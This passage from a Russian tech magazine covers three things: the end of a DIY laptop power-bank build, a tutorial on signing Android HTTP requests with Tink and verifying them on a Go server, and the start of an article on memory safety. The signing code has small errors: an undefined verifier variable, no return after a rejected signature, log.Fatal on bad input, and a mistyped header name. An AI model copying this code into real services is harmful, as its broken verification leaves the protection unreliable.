 данных в USB, чтобы устрой ство могло договориться с заряд ником о нап‐
 ряжении и токе зарядки. Стандарт простой, и ты можешь даже сам реали‐
 зовать зарядное с его поддержкой, если руки растут из нужного места. Но для
 меня было дешевле и проще купить готовую пла ту с кон троллером, бонусом
 получил поддержку не только Quick Charge 3.0, но и полдюжины дру гих про‐
 токолов.





                      Стандарты быс трой заряд ки


        WWW

                      На Хабре была хорошая статья об использовании
                       умных зарядников в своих целях. Там же описан
                       протокол, что поможет тебе соз дать соответству‐
                    ющее спецификации зарядное устрой ство самос‐
                          тоятельно.


 Расходники есть в гараже у любого уважающего себя технаря. Это гнез да 5,5
 × 2,5, провода, припой, оргстекло или пластик, кнопка, диоды и всякое такое.
    У гнезда, как ты помнишь, три контакта: один внутренний (+) и два внеш них
 (–). Внеш ние я соединил перемычкой для снижения нагрузки. Если не хочешь
 проблем, тебе сто ит сделать так же.


 СХЕМА
 Есть два сильно разных вари анта. В одном мы получим online UPS с двойным
 преобразованием и защитой от плохого питания на входе, а во втором —
 просто аварийный источник питания в параллель с основным. Естественно, я
 выбрал первый. Обе схемы представлены на рисунках ниже.





                                  Online UPS





                    Резервный источник питания

 Разница этих двух схем, как видишь, только в прямой связи между вход ным
 и выходным разъемами, но эта разница накладывает довольно ощутимые
 ограничения, которые вынудили меня отказаться от использования второй
 схемы.
    Во‐первых, при одновре менной заряд ке и исполь зовании нашей «бан ки»
 напряжение источника питания должно быть равно требуемо му выходному.
 При зарядке только своего ноутбука и только его штатной или совмести мой
 зарядкой это не ста новится проблемой, но у меня в доме четыре ноутбука,
 у трех из которых разные входные напряжения от 16 до 19,5 В. Разбежка
 может показаться некритичной, но уже от 18 В (требуется 19) мой Asus
 заряжать ся отказался.
    Во‐вторых, без диода между вхо дом и выходом выходное нап ряжение
 будет попадать и на входное гнездо, а это нехорошо, так как включится
 на зарядку понижающий пре образователь, который будет впустую тра тить
 драгоценный  заряд.  С  диодом  мы  получим  падение  напряжения
 минимум 0,3–0,4 В, даже при использовании диодов Шоттки. С обычными
 диодами все еще хуже, и напряжение на выходе может упасть ниже нужного
 для ноутбука.
   При этом у схемы с объединенным входом и выходом есть одно зна‐
 чительное пре имущес тво, которое вынудило меня упомянуть ее здесь.
 При раз ряженных аккумуляторах нашей самоделки их зарядка будет пот‐
 реблять значительную мощ ность, при этом потребление ноутбука пред ска‐
 зать  невозможно. В  таком  случае  суммарная мощность,  требуемая
 для заряд ки собственных батарей и питания подключенного ноутбука, может
 превысить  допус тимую  для  входного  понижающего  преобразователя.
 Перемычка между вхо дом и выходом здорово улучшит дело, ведь основная
 мощность пойдет через нее прямо от заряд ного в ноутбук, а через преобра‐
 зователь будет проходить только мощность, требуемая для зарядки аккумуля‐
 торов, которую к тому же мож но ограничить на самом преобра зователе.
   В дальнейшем я буду описывать только схему без перемычки. Если ты
 читаешь эту статью — два провода, очевид но, сможешь припаять сам.


 ГДЕ ВЗЯТЬ КОМПЛЕКТУЮЩИЕ?
 Конечно, у себя в ящике с электронным хламом! Или у деда на рынке. Именно
 там можно за бесценок найти оргстекло или лис товой пластик, диоды, перек‐
 лючатель, про вода на любой вкус, а иног да и аккумуляторы (впро чем, обычно
 только кислотно‐свин цовые, но это уже детали).
   Плату BMS, контроллер быстрой зарядки и DC‐DC‐пре обра зователи луч‐
 ше взять в Китае: суммарно это обойдется в 5–7 баксов, зато избавит
 от головной боли и откровенного колхоза с самопальными преобразователя‐
 ми, а платы будут выг лядеть по‐взрос лому и опрятно. Впрочем, некоторые
 китайские кон верте ры можно и нуж но про качать перед использовани ем. Гуг‐
 ли нечто вроде «xl4005e1 доработка», чтобы найти подробную инс трукцию.


        WWW

                     Детали, которые брал я:
                      •индикатор уровня зарядки;
                      •понижающий  DC‐DC‐пре образователь,  еще
                         один неплохой вариант;
                     •модуль быс трой зарядки;
                   •BMS 3S 25A;
                      •повышающий DC‐DCпреобразователь;
                        •аккумуляторы 18650 (еще и еще (Samsung)).


 Вот тут все‐таки не стоит сле по повторять за мной, потому что выходной DC‐
 DC‐конвертер я взял низкокачествен ный, без хорошего охлажде ния он быс‐
 тро перегрева ется. И мощность, конечно, заявленной не сов сем соответс тву‐
 ет. Так что стоит присмотреться к более продвинутым представителям это го
 класса преобразователей, чтобы был запас мощности.
    Кстати о мощности: как ты знаешь, самое опас ное для повышающих пре‐
 образователей — не короткое замыкание, а перегруз. При КЗ ток ограничи‐
 вается падением напряжения на диоде, а микросхема при этом отключается.
 А вот если с защитой какие‐то проблемы, то при перег рузке микросхема
 умрет либо от перегрева, либо от превышения тока силового транзистора.
   В общем, что бы не пришлось преждевремен но заменять выходной пре‐
 образователь, рекомен дую пос тавить туда что‐то более мощное. А мой вари‐
 ант можно исполь зовать, толь ко если мощность для заряд ки твоего ноут бука
 требуется неболь шая, не выше 40 Вт.


                                      Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
    ГАЛЬВАНИЧЕСКАЯ
             БАНКА
               ДЕЛАЕМ POWER BANK ДЛЯ НОУТБУКА
                       В ДОМАШНИХ УСЛОВИЯХ





СОБИРАЕМ
Предположим, что нужные для сборки компоненты у тебя уже имеются.
  Особое внимание я уделю аккумуляторам, а точ нее — их подклю чению.
Они очень не любят перегрева, и в заводских условиях их соединяют точеч‐
ной сваркой. У меня такого гаджета нет, так что я воспользовался старым
добрым паяльником на 80 китайских ватт. Нуж но чем‐нибудь острым немного
поцарапать контактные площадки на банках, хорошо залить канифолью
поцарапанные места и как можно быстрее про паять мес то, ни в коем случае
не перегревая аккумулятор. При нагреве он необ ратимо меняет свою внут‐
реннюю структуру и теряет емкость, так что процедуру нужно выполнить нас‐
только быстро, насколько это возможно. Если не хочется заниматься таким,
есть альтернативные способы.
 • Точечная сварка. Сварочный аппа рат мож но купить или сделать самос‐
   тоятельно из трансформатора от микроволновки. Самый правильный
   и надеж ный способ.
 • Маг ниты. Годятся скорее для временных конс трукций, которые не тре‐
   буют высокой надежности, дешевы и быс тро собираются. Исполь зуют
   обычно малень кие плос кие круглые магниты, которые в изобилии пред‐
   ставлены на AliExpress и других пло щадках.
 • Хол деры. Действительно, зачем вообще насиловать акку муля тор, если
   его можно просто вставить в специальный пластиковый держатель?
   Это  очень просто  в сбор ке,  а при необходимости  поврежденный
   или  непонравившийся  элемент можно  легко  и  быстро  заменить.
  Минусы — добавляют лишние несколько миллиметров с каждой стороны,
   стоят не такие уж копейки, и подводящие про вода на больших нагрузках
   могут заметно греться. Качественные же холдеры стоят еще дороже —
   по цене они сопоставимы с дешевыми аккумуляторами.
 • Изначально при варенные продавцом никелевые ленты . Они поз воляют
   припаяться к аккумулятору легко и без перегрева. Наверное, наиболее
   годный вари ант после сварки.

Так как в мою деревню нормальные магазины не завез ли, пришлось кол‐
хозить из чего было. У меня валялось шесть штук розовых банок Samsung
по 2600 мА ⋅ ч и три безымянные новые (без следов пай ки или сварки) банки
по 3000 мА ⋅ ч. Для батареи я выб рал конфигурацию 3S3P, где вся батарея
собрана из трех одинаковых блоков (две бан ки Samsung и одна безымянная),
чтобы емкость сег ментов была приблизительно одинаковая. Все банки были
спаяны и надежно замотаны красной изолентой.
   Теперь нуж но подцепить их к BMS.





                          Плата BMS

Батареи собираются немного необыч но для нович ков, но если подумать —
все становит ся оче вид но.





                   Как подключать банки 18650 к BMS

При этом емкость можно увеличить, до бесконеч ности добав ляя параллельно
еще ячейки.
  И нагрузка, и заряд ка подключаются к единственным оставшим ся площад‐
кам с метками P+ и P‐. Минус будет у всей схемы общий, его можно сразу
припаивать к выходу понижающего модуля на вхо де, а вот с плюсом стоит
повременить.
  Дело в том, что экономные китайцы решили не ставить диод на выход
понижающего модуля. Из‐за этого, пока выход модуля подключен к батарее,
на нем всегда светит ся индикаторный диод, а на входе платы (и на входном
гнезде) появляется напряжение батареи. И если постоянно светящийся све‐
тодиод можно попросту выпаять, то напряжение на входе — это совсем не по
фэншую, надо исправлять. Желания городить свой преобразователь не было,
так что я просто взял мощный диод и поставил его в разрыв плюсовой линии
от зарядного модуля к плюсу BMS. Решение грязное, но рабочее. Можно
было воткнуть диодную сборку Шоттки из компьютерного блока питания,
но пусть пока так. Хотя, конеч но, падение напряжения у нее было бы меньше,
как и наг рев.
   Дальше нужно под клю чить выходной преобразователь. Его питаем через
кнопку, что бы на выходе не было напряжения постоянно. На саму микросхему
стоит нак леить радиатор — греться он должен и будет. По выходу добавил
красивый совет ский конденса тор на 25 В / 470 мкФ.
  Провода я использую толстые медные многожильные с сечением 1,2 мм,
чтобы точно не грелись. Из них же скручиваем выходной про вод к штекеру
для заряд ки самого ноутбука. Я сделал 25 см — хватает.
   Чтобы в критический момент не гадать, сколько осталось зарядки в нашей
гальваничес кой банке, и своевременно ее заряжать, я заказал простой инди‐
катор уров ня оставшегося заряда. Мой экземпляр настраиваемый, у него
можно выбрать, сколько ячеек соединено пос ледовательно, но если надума‐
ешь брать не такой, как у меня, — убедись, что он рассчитан на соеди‐
нение 3S. Его минус я подпаял к общему, а плюс — после кнопки, чтобы он
не горел все время. К тому же он довольно яркий и кушает ненуле вой ток, так
что еще и из соображений энергосбе режения стоит пос тупить, как я.
  Вообще, изначально я думал пос тавить электрон ную измерительную
головку с вольтметром и амперметром, при этом амперметр подключить
в разрыв выходной цепи после повыша ющего преобра зова теля. Воль тметр
же сделать переключаемым, что бы при желании можно было смотреть нап‐
ряжение на батарее до преобразователя, а остальное время — напряжение
на выходе, который на заряд ку ноутбука. Потом сообразил, что поздновато
об этом подумал, перспектива ждать еще два месяца меня не прельщала,
и от идеи я отказался, поставив изначально купленный индикатор.
   Теперь пос ледний модуль — быстрая зарядка. Входное напряжение
для него — 12 В, так что я подал питание прямо от батареи через ту же кноп‐
ку, что и выход ноутбука. На вход — импортный электролитический конденса‐
тор 16 В / 470 мкФ, но можно и без него.


Настройка
Настройка крайне проста. Мой мультиметр немного модернизирован, чтобы
были щупы‐кро коди лы, что сейчас ока залось очень удобно. Один щуп я
посадил на общий минусовый кон такт, второй — сразу после диода, на про‐
вод, иду щий к BMS. От плюса BMS провод пока что следует отпаять. Теперь
подключаем ноутбучное зарядное ко входу понижающего модуля и крутим
ручку напряжения до получения 12,6 В на мультиметре. Отключаем щуп, при‐
паиваем про вод на место к BMS.
   Теперь положительный щуп вешаем на выход повышающего преобразова‐
теля, пред варительно выставив на нем минимальное напряжение. Включаем
кнопку, мультиметр должен показать напряжение батареи. Крутим ручку нап‐
ряжения на выход, пока не получим требуемый ноутбуком (у меня 19 В).
Отключаем кнопку и снимаем оба щупа мультиметра. Настройка завершена.
   Все,  с  элек трон ной  начинкой  совсем  закончили.  Осталось  только
положить это в какой‐нибудь корпус.


Корпус
Промдизай нер из меня крайне слабый, я предпочитаю делать так, чтобы
просто работало. Поэтому я просто засунул все в коробку от шурупов,
которая удачно попалась на глаза при сборке.
  В ней я про резал отверстие под входное гнездо и посадил его на тер‐
мосопли. Такая же участь постигла модуль быс трой зарядки, он расположил‐
ся вверх дном над аккумуляторами и был надежно залит все теми же соплями.
  Отверстие под кнопку было прореза но задней левой ногой, иначе я
не могу объяснить собственную косорукость. Еще одна прорезь была
выцарапана прямо в месте контакта крышки и боковой стенки. Она по высоте
ровно как сложенный вдвое провод, а по ширине как одинар ный. Сам провод
я не прик леивал туда, чтобы его можно было убрать в небольшое сво бодное
место внутри сбо ку, когда он не нужен. В том же свободном месте рас‐
положился инди катор уровня зарядки.





Плата BMS была приклеена прямо сверху на аккумуля торы, рядом с ней —
плата входного понижающего преобразователя с радиатором. Она немного
упирается в крыш ку, но это почти незаметно.
  Выходной конвертер я помес тил возле кнопки в свободное место между
аккумуляторами. Как ты помнишь, у меня девять ячеек 18650, но расположил
я их в два слоя: пять в нижнем и четыре в верхнем. В оставшееся место прек‐
расно влез повышающий модуль.
   Что ни в коем случае забывать нельзя (и о чем я благополуч но забыл вна‐
чале) — ради атор повышающего преобразователя (да и понижа ющего тоже)
не должен касаться аккумуляторов, иначе тебе грозит перегрев и взрыв!
Радиатор мож но отде лить фольгой, но вместо этого я переклеил его чуть
выше, чтобы он не касался банок. Во время работы я просто откры ваю крыш‐
ку, что бы радиатор нормально охлаждался. Колхоз? Нет, не слышал!


        WWW

                      Если захочешь собрать свой, более практичный
                       корпус,  о  разных  материалах  для  корпусов
                    можешь почитать в этой статье.



ФОТКИ
Перфекционистам и лицам впе чатлительным к просмотру строго противо‐
показано!





В закрытом и сло жен ном виде гад жет довольно компактный.





Вид внут ри. Провода, хоть и торчат, не мешают. О тех нике безопасности так‐
тично про молчу.





Зарядное гнез до щед ро залито термокле ем. И аккумуля торные банки тоже.
На бумаж ке написано напряжение — чтобы не перепутать про вода при сбор‐
ке.





Новенький инди катор (решил пока не приклеивать).





А ночью это просто кра сиво. Мягкий голубой свет от диода на модуле быс‐
трой заряд ки помогает не потерять его в темноте.


ЭПИЛОГ
Как видишь, собрать полезный в хозяйстве гаджет сво ими руками совсем
несложно! А если довести до ума внешний вид — будет совсем хорошо. Успе‐
хов в повторении, и не забывай о спе цифических нравах литиевых акку муля‐
торов.
КОДИНГ
ПОЛУЧИ
  И РАСПИШИСЬ





      ЗАЩИЩАЕМ ПОДПИСЬЮ
       ЗАПРОСЫ ПРИЛОЖЕНИЯ
           ДЛЯ ANDROID





Цифровая под пись запросов к серверу —
это не какая‐то чер ная магия или удел
избран ных   сум рачных   безопасников.
Реали зация    этой    фун кци ональнос ти
в мобиль ном приложении впол не по силам             Артем                                                                                            ﬁ5t@protonmail.com
любому   хороше му   разработ чику  —
при условии, что он зна ет правиль ные инс‐
трументы и под ход к этой задаче. И если
хорошим  раз работ чиком  тебе  придется
становиться самос тоятельно, то о пра виль‐
ных инс тру мен тах и подходах я рас скажу
в этой статье.


При разработке клиент‐серверных приложе ний под Android есть нес колько
очевидных  способов  сделать  соединение  безопаснее.  Кажется,  что
к 2020 году уже все выучили аббревиатуру HTTPS как ман тру, да и Google
со своей стороны помогает, запрещая по умолчанию HTTP‐трафик в новых
версиях ОС. Чуть более продвинутые товарищи знают, что сам по себе HTTPS
защищает не от всех векторов атак (привет, Мэллори!), и накручивают SSL
Pinning (aka Certiﬁcate/Public Key Pinning). Чаще все го защита канала на этом
заканчивается. Да и честно говоря, в большинстве случаев этой защиты дос‐
таточно. Особенно если с помощью шифрования пользовательских данных
и проверки на недоверенное окружение ликвидиру ются другие векторы ата‐
ки.
  Но бывает и по‐другому. Приложение вынуждено работать в недоверен‐
ной среде, а это значит, что зловред на кли ентском устройстве может перех‐
ватить токены доступа к серверу прямо из памяти приложения. Далее,
в зависи мос ти от реализации механизма инва лидации этих токенов, зло‐
умышленник какое‐то время может выполнять запросы от лица пользователя.
У этой проблемы есть решение — вешать цифровую подпись на все запросы,
выполняющиеся из авторизованной зоны. Как правило, это все запросы,
которые не /login или /register. О том, как реализовать подпись запросов
на клиенте и на сервере, а так же о подводных камнях и огра ниче ниях этой
техники погово рим в статье.


КРИПТОЛИКБЕЗ
Чтобы сделать повествование более системным, давай для начала синхро‐
низируемся в понятиях и освежим знания криптографии, если они по какой‐то
причине зап лесне вели.
   Начнем с понятия циф ровая подпись. Тема ЦП довольно обширная,
поэтому ограничим ся асимметричной схемой цифровой подписи, в которой
участвуют открытый и закрытый ключи. В самом простом случае цифровая
подпись работает по следующему алгоритму:
 1. Алиса шиф рует документ своим зак рытым ключом, тем самым подписывая
   его.
 2. Алиса отправляет подписанный документ Бобу.
 3. Боб расшифровывает документ с помощью открытого ключа Алисы, тем
  самым про веряя подпись.

Это работа ет, но есть проблема. Если документ, подписанный Али сой, — чек
на некото рую сумму денег, то неблагонадежный Боб сможет обналичивать
этот чек, пока у Али сы не закончатся деньги на счете или пока Боба не пой‐
мают. Для борь бы с этой проблемой при меня ются метки времени. Алиса
добавляет к документу текущее время и шифрует его вместе с докумен том.
Банк, в который Боб приносит этот чек и открытый ключ Алисы, расшифро‐
вывает документ и сохраняет метку вре мени. Теперь при попытке обналичить
такой чек пов торно банк заблокирует эту операцию, так как метки времени
будут оди нако вые.
  Еще не зас кучал? Потерпи, это все нам при годит ся уже скоро, когда будем
писать реали зацию. Финальный аспект, который хочет ся обсудить, — про‐
изводительность асимметричных криптосистем. Они оказываются довольно
неэффективны на боль ших массивах данных, а значит, попытка применить
этот подход для подписи объемных запросов будет нещадно жрать батарею
смартфона и замедлять обще ние с сервером. Для уско рения всей этой
машинерии принято использовать односторонние хеш‐функции. Итоговая
версия алго ритма будет выглядеть так:
 1. Алиса вычисляет значение хеш‐функции для документа.
 2. Алиса шиф рует это значение своим зак рытым клю чом, тем самым под‐
   писывая документ.
 3. Алиса посыла ет Бобу документ и подписанное хеш‐значение.
 4. Боб вычисляет значение хеш‐функции для документа, присланного Али‐
   сой.
 5. Боб расшифровывает значение хеш‐функции документа, присланного
   Алисой.
 6. Боб сравнивает это значение с вычисленным самостоятельно. Если они
   совпадают, то подпись под линна.





                    Как работа ет циф ровая подпись

Как вид но из примеров — надежность механизма цифровой под писи базиру‐
ется на двух предположениях:
 1. Зак рытый ключ Алисы доступен только ей и больше никому.
 2. У Боба находится открытый ключ именно Алисы, а не кого‐то дру гого.


РЕАЛИЗАЦИЯ КЛИЕНТСКОЙ ЧАСТИ
Теперь ты должен при мерно представлять, как можно реали зовать под пись
запросов. Способов реали зации больше одно го, но я покажу самый,
по моему мне нию, простой и удобный.
  Для начала определимся с генерацией ключей и с самим алгоритмом
цифровой подписи. Очень не рекомендую писать это все руками, исполь зуя
криптопримитивы из Android SDK. Лучше взять готовое и зарекомен довавшее
себя  решение —  библиотеку  Tink,  написанную  сумрачными  гениями
из Google. Она решает сразу несколько наших проблем:
 • сохраняет ключи в Android Keystore, что практически исклю чает их насиль‐
   ственное  извле чение  с  устройства.  А  значит,  обеспечивает  нам
   истинность первого предположения о надежности механизма цифровой
   подписи;
 • предоставляет надежный алгоритм подписи на эллиптических кривых —
  ECDSA P‐256;
 • предоставляет удобные криптопримитивы и API для соз дания цифровой
   подписи.

Подключаем библиотеку к проекту (implementation 'com.google.crypto.
tink:tink‐android:1.5.0') и генерируем пару ключей, которые сразу будут
сохранены в Android Keystore:


companion object {
  const val KEYSET_NAME = "master_signature_keyset"
  const val PREFERENCE_FILE = "master_signature_key_preference"
  const val MASTER_KEY_URI = "android‐keystore://
master_signature_key"
}


SignatureConfig.register()


val privateKeysetHandle = AndroidKeysetManager.Builder()
  .withSharedPref(application, KEYSET_NAME, PREFERENCE_FILE)
  .withKeyTemplate(EcdsaSignKeyManager.ecdsaP256Template())
  .withMasterKeyUri(MASTER_KEY_URI)
  .build()
  .keysetHandle

Чтобы сервер мог про верить нашу цифровую подпись, ему нужно как‐то
передать публичный ключ от той пары, которую мы сге нерировали выше.
Делать это пра вильнее всего на эта пе авториза ции. Публичный ключ не сек‐
ретный, поэто му мы вполне можем передать его прямо в запросе вместе
с логином и паролем пользователя, пред варительно закодировав в Base64:


val bos = ByteArrayOutputStream()
val w = BinaryKeysetWriter.withOutputStream(bos)


privateKeysetHandle.publicKeysetHandle.writeNoSecret(w)


val response = api.login(
  LoginRequest(
    username,
    password,
    Base64.encodeToString(bos.toByteArray(), Base64.DEFAULT)
  )
)


bos.close()

Tink не позволяет работать с ключевым материалом напрямую. Вместо это го
библиотека предлагает концепцию  Reader/Writer’ов, которые поз воляют
читать и писать ключи в JSON‐представлении или в бинарном. Подробнос ти
есть в документации.
   Теперь получим примитив для соз дания цифровой под писи:


val signer = privateKeysetHandle.getPrimitive(PublicKeySign::class.
java)

После написа ния кода можно и поп роектировать ;) Если ты забыл пос тановку
задачи, то нам нужно обеспечить под пись всех запросов из авторизованной
зоны. Про ще всего это сде лать с помощью абс тракции network interceptor
из библиотеки OkHttp. Что‐то похожее можно сделать на чем угодно, но с
OkHttp удобнее. Составим список функциональных тре бований к нашему
механиз му под писи запросов:
 1. Подписывать нужно только запросы из авторизованной зоны.
 2. В под пись должны быть включены сле дующие стандар тные заголовки: Au
  thorization , UserAgent .
 3. К запросу необ ходимо добавить метку времени в виде заголовка Data ,
   который так же должен быть подписан. Значение заголовка — дата и вре мя
   в формате ISO‐8601.
 4. Дан ные для подписи формируются по сле дующе му шаблону:


   (request‐target): %method% %request_uri%\n
   host: %host_header_value%\n
   authorization: %authorization_header_value%\n
   user‐agent: %user‐agent_header_value%

 5. До бавить к запросу заголовок X‐Signed‐Headers, в котором нужно ука‐
   зать заголов ки, участвующие в подписи в том же поряд ке, в каком они
  были добав лены в строку для фор мирова ния подписи.
 6. Для запросов с телом необ ходимо допол нительно вычис лять хеш SHA‐
   512 от тела и добавлять его как в виде заголовка Digest, так и в строку
   для формирова ния подписи.
 7. До бавить к запросу заголовок X‐Signature, содержащий закодированную
   в Base64 цифровую подпись.

Если что‐то осталось непонятным, то не пережи вай. Сейчас мы это все
реализуем в коде, и понимание сразу наступит. По крайней мере, я в это
верю...
   Весь исходный код будет дос тупен по ссылке в конце статьи, поэто му
дальше мы разберем только действительно важные час ти. Весь код находит‐
ся внут ри класса‐перехватчика, который мы потом подключим в конструктор
OkHttp‐кли ента:


class SigningInterceptor constructor(val signer: PublicKeySign) :
Interceptor {
  override fun intercept(chain: Interceptor.Chain): Response {
    // Почти все находится здесь
  }
}

Для выполнения первого тре бования отстрелим все запросы из неавторизо‐
ванной зоны. Благо у нас такой только один — запрос на авториза цию.


val originalRequest = chain.request()


if (originalRequest.url.encodedPath.contains("/login") &&
originalRequest.method == "POST") {
  return chain.proceed(originalRequest)
}

Теперь составим список имен  заголов ков, которые  будут  участвовать
в подписи. Не забудь, порядок сле дования важен!


val headerNames = mutableListOf("authorization", "user‐agent", "datе"
)

Здесь указаны не только стандартные заголовки, но и допол нительные.
Из дополнительных у нас пока только метка времени. Сами дополнительные
заголовки объявим в другой переменной:


val additionalHeaders = mutableMapOf(
  "Datе" to LocalDateTime.now().toString()
)

Тут есть важный нюанс — если планируется использовать метку времени
не просто для сравнения описанного в теоретической части, а для чего‐то
более умно го, то часы клиента и сервера должны быть синхронизи рованы.
   Теперь, по требованию 4, составим строку, которую будем потом под‐
писывать:


val originalHeaders = originalRequest.headers
  .filter { headerNames.contains(it.first.toLowerCase()) }
  .associateBy({ it.first.toLowerCase() }, { it.second })


val headersToSign = originalHeaders + additionalHeaders.mapKeys { it.
key.toLowerCase() }
val requestTarget = "(request‐target): ${originalRequest.method.
toLowerCase()} ${originalRequest.url.encodedPath}\n"


val signatureData = requestTarget + headerNames.joinToString("\n") {
  "$it: ${headersToSign[it]}"
}

Осталось вычислить сигнатуру, прикрепить  к запросу все необходимые
заголовки и запустить на выполнение:


val signature = Base64.encodeToString(
  signer.sign(signatureData.toByteArray()),
  Base64.NO_WRAP
)


val request = originalRequest.newBuilder()
  .apply { additionalHeaders.forEach { addHeader(it.key, it.value) }
}
  .addHeader("X‐Signed‐Headers", headerNames.joinToString(separator =
" "))
  .addHeader("X‐Signature", signature)


return chain.proceed(request.build())

Убедимся, что все работа ет, и дополним нашу реализацию вычислением
хеша от тела зап роса:


originalRequest.body?.let {
  val body = okio.Buffer()
  val digest = MessageDigest.getInstance("SHA‐512").apply { reset() }


  it.writeTo(body)


  headerNames += "digest"
  additionalHeaders["Digest"] = digest.digest(body.readByteArray())
    .joinToString("") { "%02x".format(it) }
}

На этом реали зацию клиентской части можно счи тать завершенной. Добав‐
ляем перехватчик в конструктор HTTP‐клиента и переходим к реализации
серверной час ти:


val httpClient = OkHttpClient.Builder()
  .addNetworkInterceptor(signingInterceptor)
  .build()


РЕАЛИЗАЦИЯ СЕРВЕРНОЙ ЧАСТИ
Серверную часть будем реализовывать на Go. В качестве веб‐фрей мворка
возьмем Gin. Этот стек не строго обязателен для нашей задачи, поэтому
при желании ты можешь взять любой удоб ный тебе. Единственное условие,
которое обязательно в рамках этой статьи, но также не является какой‐то
догмой, — поддер жка выбранного тобой ЯП дол жна быть в библиотеке Tink.
Довольно удобно использовать одинаковую реализацию крип тографии и на
клиенте, и на сервере. Это избавляет от кучи проблем при реали зации
и дальнейшей поддер жке.
  Сначала опре делим ся с ручками, которые нам понадобятся:
 • POST /login — метод без какой‐либо авторизации, принимает логин
   и пароль;
 • POST /refresh — обновля ет токен, выданный на этапе логина;
 • GET /user — возвращает информацию о пользователе.

Можно сделать еще /logout, но, поскольку мы будем использовать JWT
в качестве токена, этот метод имеет мало смысла для мобиль ного при ложе‐
ния.
   Чтобы не усложнять себе жизнь, воспользуемся готовой middleware
для Gin, которая возьмет на себя все хлопоты с токенами, — gin‐jwt. Она
неидеаль на, но в качестве учеб ного примера впол не сойдет. Теперь у нас
есть все, чтобы набросать каркас сервера:


func main() {
  router := gin.Default()


  mw := createJwtMiddleware()


  router.POST("/login", mw.LoginHandler)


  authorized := router.Group("/")
  authorized.Use(mw.MiddlewareFunc())
  authorized.Use(signatureVerifierMiddleware())
  {
    authorized.GET("/user", userInfo)
    authorized.POST("/refresh", mw.RefreshHandler)
  }


  log.Fatal(router.Run(":8080"))
}

Функция createJwtMiddleware() нам менее интересна, так как практически
полностью повторяет пример из репозитория gin‐jwt. Она соз дает преднас‐
троенную мидлварь, которая уме ет выдавать и обновлять токены. А вот sig‐
natureVerifierMiddleware() как раз реализует верифи катор подписи зап‐
росов от кли ента, основанный на пришедшем от него публичном ключе. Ее
мы разберем самым подробным образом чуть ниже. Публичный ключ клиента
можно хранить где угодно, но в данном примере я исполь зую для этого базу
данных SQLite.
   Теперь раз берем ся, как реализовать мидлварь с верификато ром подписи.
Для начала необходимо самостоятельно сформировать подпись по тому же
алгоритму, который мы использовали на клиенте:


requestTarget := fmt.Sprintf("(request‐target): %s %s",
  strings.ToLower(ctx.Request.Method),
  ctx.Request.RequestURI
)


signedHeaderNames := strings.Split(ctx.GetHeader("X‐Signed‐Headers"),
" ")
signatureData := []string{requestTarget}


for _, name := range signedHeaderNames {
  value := fmt.Sprintf("%s: %s", name, ctx.GetHeader(name))
  signatureData = append(signatureData, value)
}


signatureString := strings.Join(signatureData, "\n")

Для создания верификатора нам потребуется публичный ключ пользователя.
Его нуж но загрузить из базы и преобразовать:


username := jwt.ExtractClaims(ctx)["id"]
row := db.QueryRow("SELECT public_key FROM users WHERE username == ?"
, username)


var public_key string
if err := row.Scan(&public_key); err != nil {
  log.Fatal(err)
}


res, _ := base64.StdEncoding.DecodeString(public_key)
buf := bytes.NewBuffer(res)
r := keyset.NewBinaryReader(buf)
pub, _ := keyset.ReadWithNoSecrets(r)


verifier, err := signature.NewVerifier(pub)
if err != nil {
  log.Fatal(err)
}

Теперь у нас есть все компоненты, что бы проверить подпись пришедшего
запроса. Вари ант под писи, которую пос читал backend, уже лежит в signa‐
tureString. Под пись, при шед шую от клиента, сохраняем в inputSignature
и верифи цируем:


inputSignature, err := base64.StdEncoding.DecodeString(ctx.GetHeader(
"X‐Signature"))
if err != nil {
  log.Fatal(err)
}


if err := v.Verify(inputSignature, []byte(signatureString)); err !=
nil {
  ctx.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": err.
Error()})
}

Полную реализацию можно будет так же найти по ссылке в конце статьи.


КОЕ-ЧТО ЕЩЕ...
Искушенный читатель, скорее всего, уже догадался, какая проблема у опи‐
санной схемы. Это момент отправки пуб личного ключа на сервер. Если зло‐
умышленник полностью контролирует канал передачи и смог перехватить
публичный ключ во время авторизации пользователя, то ему нич то не меша ет
подменить этот ключ своим. В этом случае он также получает возможность
подписывать зап росы самостоятельно, что сво дит к нулю безопасность при‐
веденной схемы. Работает это следующим образом.





                MITM с подменой публичного ключа

Самый прос той способ прикрыть ся от этой проблемы — реализовать Certiﬁ‐
cate  Pinning  на  сто роне мобиль ного приложения. До  версии  Android
7.0 это луч ше все го делать через CertiﬁcatePinner в OkHttp, а начиная с этой
версии — через Network Security Conﬁg.


ИТОГИ
Надеюсь, теперь ты гораздо лучше понимаешь, зачем нужна подпись зап‐
росов и как ее правильно реализовать относительно небольшими уси лиями.
Конечно, это все равно дополнительная работа и код, который нужно под‐
держивать, да и разбираться в этом всем тоже на каком‐то уровне нужно.
Именно поэтому мно гие компании не реализуют у себя такую полезную прак‐
тику, оставляя злоумышленникам лазейки в безопасности. Но ты теперь зна‐
ешь, что надо делать.


        WWW

                     •Репозиторий с кодом Android‐приложения
                     •Репозиторий с кодом бэкенда на Go
                         •Signing HTTP Messages
КОДИНГ
БЕЗОПАСНОСТЬ
ПАМЯТИ

       УЧИМСЯ ИСПОЛЬЗОВАТЬ
     УКАЗАТЕЛИ И ЛИНЕЙНЫЕ ТИПЫ





                                      Даниил Батурин
                                         Координатор проекта VyOS
                                                      (https://vyos.io), «языковед»,
                                          функциональщик, иногда
                                             сетевой администратор
                                                       daniil@baturin.org





Основные проблемы с управлением памятью мож но раз‐
делить на два клас са. Пер вый — утеч ки памяти. Утеч ка воз‐
никает, если программа запрашива ет у ядра ОС блок памяти
и забывает ее освободить. Проб лема с утеч ками памяти
неприятная, но отно сительно безопас ная — в край нем слу‐
чае ее можно «решить» периодичес ким перезапуском прог‐
раммы. Второй класс — проблемы безопасности памяти,
которые мы и обсу дим в этой статье.


К проблемам безопасности относятся:
 • обращение к неверному указателю (в том числе перепол нение буфера
   и разыме нова ние NULL );
 • ошибочное обращение к уже освобожденной памяти (use after free);
 • ошибочная попыт ка освободить ранее осво божденный указатель (double
    free).


             INFO

                     Рекомендую  также озна комиться с моей пре‐
                     дыдущей статьей, где я рассматривал механизмы
                      сбор ки мусора и их осо бен ности.


Как мы видели на примере с использованием Boehm GC в C, сборка мусора
сама по себе реша ет только проблему с утечками памяти. Безопасность
памяти обес печивают уже свойства самого языка.
   Ассоциация между сбор кой мусора и безопас ностью памяти возникает
от того, что многие популяр ные прикладные языки не разрешают ручное
управление памятью и адресную ариф метику вовсе, — в этих условиях
